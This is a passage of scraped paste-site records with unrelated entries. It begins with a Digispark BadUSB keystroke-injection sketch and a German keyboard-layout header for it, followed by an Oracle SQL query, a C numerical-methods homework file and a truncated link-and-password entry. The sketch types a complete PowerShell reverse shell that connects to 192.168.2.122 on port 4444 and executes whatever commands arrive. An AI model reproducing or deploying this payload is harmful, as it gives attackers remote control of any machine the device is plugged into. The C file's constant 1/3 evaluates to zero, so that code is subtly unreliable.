DigiKeyboardDe.sendKeyStroke(KEY_ARROW_LEFT);\n\xa0 DigiKeyboard.delay(500);\n\xa0 DigiKeyboardDe.sendKeyStroke(KEY_ENTER);\n}\n\xa0\n\xa0\nvoid loop() {\n\xa0 DigiKeyboard.update();\n\xa0 DigiKeyboardDe.sendKeyStroke(0);\n\xa0\n\xa0 StartAdminCMD();\n\xa0 \n\xa0 DigiKeyboard.delay(1000);\n\xa0 DigiKeyboardDe.println(F(""powershell -command \\""$client = New-Object System.Net.Sockets.TCPClient(\'192.168.2.122\',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd) + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\\"""")); \n\xa0 DigiKeyboard.delay(5000);\n\xa0 digitalWrite(1, HIGH); \n\xa0 DigiKeyboard.delay(90000);\n\xa0 digitalWrite(1, LOW);\n\xa0 DigiKeyboard.delay(5000);\n}\n\xa0\n//Remove .Path from (path)+\n//-windowstyle Maximized', date='2022-06-01 13:09:44 +00:00', hash_val='83c20c8c1f7a970af22ecea417e27d75', url='/a22PZrCN', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='Farliam', title='GermanLayout.h', content='#include ""DigiKeyboard.h""\n#ifndef DIGIKEYBOARDDE_H\n#define DIGIKEYBOARDDE_H\n\xa0\n\xa0\n#define DE_MOD_CONTROL_LEFT \xa0 \xa0(1<<8)\n#define DE_MOD_SHIFT_LEFT \xa0 \xa0 \xa0(1<<9)\n#define DE_MOD_ALT_LEFT \xa0 \xa0 \xa0 \xa0(1<<10)\n#define DE_MOD_GUI_LEFT \xa0 \xa0 \xa0 \xa0(1<<11)\n#define DE_MOD_CONTROL_RIGHT \xa0 (1<<12)\n#define DE_MOD_SHIFT_RIGHT \xa0 \xa0 (1<<13)\n#define DE_MOD_ALT_RIGHT \xa0 \xa0 \xa0 (1<<14)\n#define DE_MOD_GUI_RIGHT \xa0 \xa0 \xa0 (1<<15)\nconst uint16_t _ascii_de_map[128] PROGMEM =\n\xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // NUL\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // SOH\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // STX\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // ETX\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // EOT\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // ENQ\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // ACK\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // BEL\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x2a, \xa0 \xa0 // BS Backspace\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x2b, \xa0 \xa0 // TAB \xa0Tab\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x28, \xa0 \xa0 // LF Enter\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // VT\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // FF\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // CR\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // SO\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // SI\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // DEL\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // DC1\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // DC2\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // DC3\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // DC4\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // NAK\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // SYN\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // ETB\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // CAN\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // EM\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // SUB\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // ESC\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // FS\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // GS\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // RS\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x00, \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // US\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x2c, \xa0 \xa0 \xa0// \xa0\' \'\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x1e|DE_MOD_SHIFT_LEFT, \xa0 \xa0// !\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x1F|DE_MOD_SHIFT_LEFT, \xa0 \xa0// ""\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x38, \xa0 \xa0// #\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x21|DE_MOD_SHIFT_LEFT, \xa0 \xa0// $\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x22|DE_MOD_SHIFT_LEFT, \xa0 \xa0// %\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x23|DE_MOD_SHIFT_LEFT, \xa0 \xa0// &\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x32|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0 \xa0 \xa0// \'\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x25|DE_MOD_SHIFT_LEFT, \xa0 \xa0// (\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x26|DE_MOD_SHIFT_LEFT, \xa0 \xa0// )\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x30|DE_MOD_SHIFT_LEFT, \xa0 \xa0// *\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x30, \xa0 \xa0// +\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x36, \xa0 \xa0 \xa0 \xa0 \xa0// ,\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x38, \xa0 \xa0 \xa0 \xa0 \xa0// -\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x37, \xa0 \xa0 \xa0 \xa0 \xa0// .\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x24|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0 \xa0 \xa0// /\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x27, \xa0 \xa0 \xa0 \xa0 \xa0// 0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x1e, \xa0 \xa0 \xa0 \xa0 \xa0// 1\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x1f, \xa0 \xa0 \xa0 \xa0 \xa0// 2\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x20, \xa0 \xa0 \xa0 \xa0 \xa0// 3\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x21, \xa0 \xa0 \xa0 \xa0 \xa0// 4\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x22, \xa0 \xa0 \xa0 \xa0 \xa0// 5\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x23, \xa0 \xa0 \xa0 \xa0 \xa0// 6\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x24, \xa0 \xa0 \xa0 \xa0 \xa0// 7\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x25, \xa0 \xa0 \xa0 \xa0 \xa0// 8\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x26, \xa0 \xa0 \xa0 \xa0 \xa0// 9\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x37|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// :\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x36|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0 \xa0 \xa0// ;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x64, \xa0 \xa0 \xa0// <\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x27|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0 \xa0 \xa0// =\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x64|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// >\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x2D|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// ?\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x14|DE_MOD_ALT_RIGHT, \xa0 \xa0 \xa0// @ 0x40 0x14\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x04|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// A\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x05|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// B\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x06|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// C\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x07|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// D\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x08|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// E\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x09|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// F\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x0a|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// G\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x0b|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// H\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x0c|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// I\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x0d|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// J\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x0e|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// K\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x0f|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// L\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x10|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// M\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x11|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// N\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x12|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// O\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x13|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// P\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x14|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// Q\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x15|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// R\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x16|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// S\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x17|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// T\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x18|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// U\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x19|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// V\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x1a|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// W\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x1b|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// X\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x1d|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// Y\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x1c|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// Z\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x25|DE_MOD_ALT_RIGHT, \xa0 \xa0 \xa0 \xa0 \xa0// [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x2d|DE_MOD_ALT_RIGHT, \xa0 \xa0 \xa0 \xa0 \xa0// bslash\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x26|DE_MOD_ALT_RIGHT, \xa0 \xa0 \xa0 \xa0 \xa0// ]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x35, \xa0 \xa0// ^\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x38|DE_MOD_SHIFT_LEFT, \xa0 \xa0// _\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x2E|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0 \xa0 \xa0// `\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x04, \xa0 \xa0 \xa0 \xa0 \xa0// a\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x05, \xa0 \xa0 \xa0 \xa0 \xa0// b\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x06, \xa0 \xa0 \xa0 \xa0 \xa0// c\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x07, \xa0 \xa0 \xa0 \xa0 \xa0// d\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x08, \xa0 \xa0 \xa0 \xa0 \xa0// e\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x09, \xa0 \xa0 \xa0 \xa0 \xa0// f\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x0a, \xa0 \xa0 \xa0 \xa0 \xa0// g\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x0b, \xa0 \xa0 \xa0 \xa0 \xa0// h\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x0c, \xa0 \xa0 \xa0 \xa0 \xa0// i\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x0d, \xa0 \xa0 \xa0 \xa0 \xa0// j\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x0e, \xa0 \xa0 \xa0 \xa0 \xa0// k\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x0f, \xa0 \xa0 \xa0 \xa0 \xa0// l\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x10, \xa0 \xa0 \xa0 \xa0 \xa0// m\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x11, \xa0 \xa0 \xa0 \xa0 \xa0// n\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x12, \xa0 \xa0 \xa0 \xa0 \xa0// o\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x13, \xa0 \xa0 \xa0 \xa0 \xa0// p\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x14, \xa0 \xa0 \xa0 \xa0 \xa0// q\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x15, \xa0 \xa0 \xa0 \xa0 \xa0// r\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x16, \xa0 \xa0 \xa0 \xa0 \xa0// s\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x17, \xa0 \xa0 \xa0 \xa0 \xa0// t\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x18, \xa0 \xa0 \xa0 \xa0 \xa0// u\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x19, \xa0 \xa0 \xa0 \xa0 \xa0// v\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x1a, \xa0 \xa0 \xa0 \xa0 \xa0// w\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x1b, \xa0 \xa0 \xa0 \xa0 \xa0// x\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x1d, \xa0 \xa0 \xa0 \xa0 \xa0// y\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x1c, \xa0 \xa0 \xa0 \xa0 \xa0// z\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x24|DE_MOD_ALT_RIGHT, \xa0 \xa0// {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x64|DE_MOD_ALT_RIGHT, \xa0 \xa0// |\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x27|DE_MOD_ALT_RIGHT, \xa0 \xa0// }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x30|DE_MOD_ALT_RIGHT, \xa0 \xa0// ~\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0 \xa0 \xa0 \xa0 // DEL\n\xa0 \xa0 \xa0 \xa0 };\n\xa0\nclass DigiKeyboardDeviceDe : public DigiKeyboardDevice{\n\xa0 \xa0 public:\n\xa0 \xa0 size_t write(uint8_t chr) {\n\xa0 \xa0 \xa0 \xa0 unsigned int temp = pgm_read_word_near(_ascii_de_map + chr);\n\xa0 \xa0 \xa0 \xa0 unsigned char low = temp & 0xFF;\n\xa0 \xa0 \xa0 \xa0 unsigned char high = (temp >> 8) & 0xFF;\n\xa0 \xa0 \xa0 \xa0 sendKeyStroke(low,high);\n\xa0 \xa0 \xa0 \xa0 return 1;\n\xa0 \xa0 }\n\xa0 \xa0 void sendKeyReport(uchar *array,const unsigned int size){\n\xa0 \xa0 \xa0 \xa0 while (!usbInterruptIsReady()) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // Note: We wait until we can send keyPress\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // \xa0 \xa0 \xa0 so we know the previous keyPress was\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // \xa0 \xa0 \xa0 sent.\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 usbPoll();\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 _delay_ms(5);\n\xa0 \xa0 \xa0 \xa0 }\n\xa0\n\xa0 \xa0 \xa0 \xa0 usbSetInterrupt(array, size);\n\xa0 \xa0 }\n};\nDigiKeyboardDeviceDe DigiKeyboardDe = DigiKeyboardDeviceDe();\n#endif //DIGIKEYBOARDDE_H', date='2022-06-01 13:07:38 +00:00', hash_val='be263aa347259a4cf33f40779d0d1d31', url='/xQHPkXSh', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='Maks140888', title='Untitled', content="CREATE TYPE objects_below IS TABLE OF VARCHAR2(200);\n\xa0\ncreate or replace function find_objects_below(obj_x VARCHAR2)\nreturn objects_below as object_name \xa0objects_below;\nbegin \n\xa0 \xa0 select name \n\xa0 \xa0 bulk collect into object_name\n\xa0 \xa0 FROM objects \n\xa0 \xa0 START WITH objects.name = obj_x\n\xa0 \xa0 CONNECT by prior object_id = parent_id;\n\xa0\n\xa0 \xa0 return object_name;\nend;\n\xa0\nselect * from \xa0table(find_objects_below('розклад'));", date='2022-06-01 13:05:12 +00:00', hash_val='fa44e91eb93210b2eca56ef9b3f12e6e', url='/KkH3NTqf', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='_takumi', title='hw6.c', content='#include <math.h>\n#include <stdio.h>\n#include <stdbool.h>\n\xa0\ntypedef double afunc(double);\n\xa0\ndouble f(double x) {\n\xa0 \xa0 return -x*x+10;\n}\n\xa0\ndouble g(double x) {\n\xa0 \xa0 return x;\n}\n\xa0\ndouble root(afunc *f, afunc *g, double a, double b, double eps1) {\n\xa0 \xa0 double Fa, Fb, c;\n\xa0 \xa0 bool one_sign;\n\xa0 \xa0 while (true) {\n\xa0 \xa0 \xa0 \xa0 Fa = f(a) - g(a);\n\xa0 \xa0 \xa0 \xa0 Fb = f(b) - g(b);\n\xa0 \xa0 \xa0 \xa0 c = (a * Fb - b * Fa) / (Fb - Fa);\n\xa0 \xa0 \xa0 \xa0 one_sign = (Fa > 0) && (f((a + b) / 2) > (Fa - Fb) / 2)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0|| (Fa < 0) && (f((a+b)/2) < (Fa - Fb) / 2);\n\xa0 \xa0 \xa0 \xa0 if (one_sign) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 a = c;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if ((f(c) - g(c)) * (f(c + eps1) - g(c + eps1)) < 0)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 break;\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 else {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 b = c;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if ((f(c) - g(c)) * (f(c - eps1) - g(c - eps1)) < 0)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 break;\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 }\n\xa0 \xa0 return c;\n}\n\xa0\ndouble integral(afunc *f, double a, double b, double eps2) {\n\xa0 \xa0 const double p = 1/3;\n\xa0 \xa0 double n0 = 10;\n\xa0 \xa0 double h, I, In = 0, I2n = 0; //i2n - curr, in - prev\n\xa0 \xa0 while (true) {\n\xa0 \xa0 \xa0 \xa0 In = I2n;\n\xa0 \xa0 \xa0 \xa0 h = (b - a) / n0;\n\xa0 \xa0 \xa0 \xa0 I2n = 0;\n\xa0 \xa0 \xa0 \xa0 for (int i = 0; i < n0; ++i) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 I2n += f(a + (i + 0.5) * h);\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 I2n *= h;\n\xa0 \xa0 \xa0 \xa0 if ((In != 0) && (eps2 > p * fabs(In - I2n))) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 break;\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 n0 *= 2;\n\xa0 \xa0 }\n\xa0 \xa0 I = I2n;\n\xa0 \xa0 return I;\n}\n\xa0\nint main(void) {\n\xa0 \xa0 printf(""%lf"", integral(f, -1, 1, 0.000000000001));\n\xa0 \xa0 return 0;\n}', date='2022-06-01 12:48:17 +00:00', hash_val='fce26d584174850efdabb82a0ccd4ee9', url='/A5PrM16v', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='HendarOfficial', title='btcbunch2', content='Link: https://cararegistrasi.com/8aM52Mp \nPass: pengencepetkaya?NGEPET', date='2022-06-01 